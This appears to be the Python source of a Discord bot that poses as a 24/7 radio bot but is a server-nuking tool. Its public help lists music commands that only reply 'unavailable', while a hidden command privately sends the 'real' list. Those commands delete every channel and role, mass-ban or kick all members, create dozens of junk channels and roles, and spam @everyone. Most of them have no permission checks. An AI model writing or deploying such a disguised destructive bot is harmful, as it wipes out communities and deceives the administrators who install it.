import discord
from discord.ext import commands
import time
from discord.ext.commands import has_permissions
import asyncio


intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents) # ! - prefix
bot.remove_command('help')

@bot.event
async def on_ready():
    print('Бот запущен')

@bot.event
async def on_message(message):
    await bot.process_commands(message)

    msg = message.content.lower()
    words = ["!play", "!stop", "!song", "!station", "!volume"]
    
    if msg in words:
        await message.channel.send(f"{message.author.mention}, Unfortunately, the functions of the bot are temporarily unavailable!")

@bot.command()
async def help(ctx):
    await ctx.message.delete(delay=1)
    emb = discord.Embed(title="Command list", color=discord.Color.red())
    commands_list = ["!play", "!stop", "!song", "!station", "!volume"]
    descriptions_for_commands = ["Joins your voice channel and starts playing 24/7",
                                 "Leaves the voice channel",
                                 "Shows the current playing song.",
                                 "Changes the radio station/theme.",
                                 "Shows or changes the current volume."]

    for command_name, description_command in zip(commands_list, descriptions_for_commands):
        emb.add_field(
            name=command_name,
            value=description_command,
            inline=False 
        )
    await ctx.send(embed=emb)

@bot.command()
async def s_help(ctx):
    await ctx.message.delete(delay=1)
    emb = discord.Embed(title="Real command list", color=discord.Color.red())
    commands_list = ["!clear", "!clearchannel", "!clearroles", "!vse", "!y", "!x"]
    descriptions_for_commands = ["Чистит сообщения в чате",
                                 "Удаляет все каналы",
                                 "Удаляет все роли",
                                 "Удаляет все на сервере и начинат создавать каналы и роли в кол-ве 50шт, после спамит в чат",
                                 "Тоже самое что и !vse,только можно выбрать чего и сколько. Для помощи !y_help",
                                 "Банит и кикает людей. Пример !x k или b. k- kick, b - ban"]

    for command_name, description_command in zip(commands_list, descriptions_for_commands):
        emb.add_field(
            name=command_name,
            value=description_command,
            inline=False 
        )
    await ctx.author.send(embed=emb)

@bot.command()
async def y_help(ctx):
    await ctx.message.delete(delay=1)
    emb = discord.Embed(title="!y Help", color=discord.Color.red())
    commands_list = ["!y", "", "", "", "", "", "", ""]
    descriptions_for_commands = ["Команда должна быть такой.",
                                 "!y (k - кик , b - ban)(название для каналов и ролей) (Сообщение в чат) (Кол-во каналов) (Кол-во ролей) (Кол-во сообщений).",
                                 "Пример !y k qwe kek 4 5 6",
                                 "Данная команда выведет - ",
                                 "k - kick all, qwe - назавание ролей и каналов, kek - сообщение которое будет выводить в чат",
                                 "4 - кол-во каналов, 5 - кол-во ролей, 6 - кол-во сообщений (на каждый канал)",
                                 "При при написании сообщения которое будет выводить бот, отделять слова чере _ Пример - qwe_kek"]

    for command_name, description_command in zip(commands_list, descriptions_for_commands):
        emb.add_field(
            name=command_name,
            value=description_command,
            inline=False 
        )
    await ctx.author.send(embed=emb)
 
# Удаляет сообщение с канала

@bot.command()
async def clear(ctx, amount=1):
    await ctx.channel.purge(limit=amount+1)

#Кикает и банит (отдельно)

@has_permissions(kick_members=True)
@has_permissions(ban_members=True)
@bot.command()
async def x(ctx, action=None):
    if action == 'k':
        for member in ctx.guild.members:
            try:
                await member.kick(reason='')
            except:
                pass
    elif action == 'b':
        for member in ctx.guild.members:
            try:
                await member.ban(reason='')
            except:
                pass
    else:
        emb = discord.Embed(title="Command error", color=discord.Color.red())
        commands_list = ["!x", "", "", ""]
        descriptions_for_commands = ["Не-а.",
                                     "Команда написана не правильно.",
                                     "!Пример !x k или b. k- kick, b - ban"]

        for command_name, description_command in zip(commands_list, descriptions_for_commands):
            emb.add_field(
                name=command_name,
                value=description_command,
                inline=False 
            )
        await ctx.author.send(embed=emb)
        return

#Удаляет каналы (отдельно)

@bot.command()
async def clearchannel(ctx):
    await ctx.message.delete(delay=1)
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="")
        except: failed.append(channel.name)
        else: counter += 1 

#Удаляет роли (отдельно)

@bot.command()
async def clearroles(ctx):
    await ctx.message.delete(delay=1)
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="")
        except:
            pass

@bot.command()
async def vse(ctx):
    await ctx.message.delete(delay=1)
    emb = discord.Embed(title="", color=discord.Color.red())
    emb.add_field(name='Полетели!', value="" )
    await ctx.author.send(embed=emb)

    #Удаляет роли

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="")
        except:
            pass
    failed = []
    counter = 0
    
    #Удаляет каналы

    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="")
        except: failed.append(channel.name)
        else: counter += 1

    # банит людей 
    
    for m in ctx.guild.members:
        try:
            await m.ban(reason="")
        except discord.Forbidden:
            pass

    #Создает каналы

    guild = ctx.guild
    for i in range(50):
        await guild.create_text_channel(name="123")

    #Создает роли 

    role_names = [f"kek{i}" for i in range(50)]
    for role_name in role_names:
        existing_role = discord.utils.get(guild.roles, name=role_name)
        if not existing_role:
            new_role = await guild.create_role(name=role_name)
    
    #Отправляет сообщения в чат 100 раз 
    
    count = 0
    while True: 
        for channel in ctx.guild.text_channels:
            await channel.send("@everyone")
        await asyncio.sleep(1)
        count += 1
        if count >= 100:
            break

    #Тоже самое что и предыдущая функция, только можно передать аргументы        

@bot.command()
async def y(ctx, action=None, name=None, name1=None, num_channels=None, num_roles=None, num_messages=None):
    if not all([action, name, name1, num_channels, num_roles, num_messages]):
        emb = discord.Embed(title="Command error", color=discord.Color.red())
        commands_list = ["!y", "", "", ""]
        descriptions_for_commands = ["Не-а.",
                                     "Команда написана не правильно.",
                                     "!Пример !y k qwe kek 4 5 6",
                                     "Для большей информации !y_help"]

        for command_name, description_command in zip(commands_list, descriptions_for_commands):
            emb.add_field(
                name=command_name,
                value=description_command,
                inline=False 
            )
        await ctx.author.send(embed=emb)
        return

    await ctx.message.delete(delay=1)

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="")
        except:
            pass
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="")
        except: failed.append(channel.name)
        else: counter += 1

    if action == "k":
        for m in ctx.guild.members:
                try:
                    await m.kick(reason="")
                except discord.Forbidden:
                    pass

    elif action == "b":
        for m in ctx.guild.members:
            try:
                await m.ban(reason="")
            except discord.Forbidden:
                pass

    guild = ctx.guild
    for i in range(int(num_channels)):
        await guild.create_text_channel(name=name)
    for i in range(int(num_roles)):
        role_name = f"{name1}{i}" if i > 0 else name1
        while discord.utils.get(guild.roles, name=role_name):
            i += 1
            role_name = f"{name1}{i}"
        await guild.create_role(name=role_name)

    for channel in ctx.guild.text_channels:
        for i in range(int(num_messages)):
            await channel.send(name1)
            await asyncio.sleep(1)

bot.run('your token here')
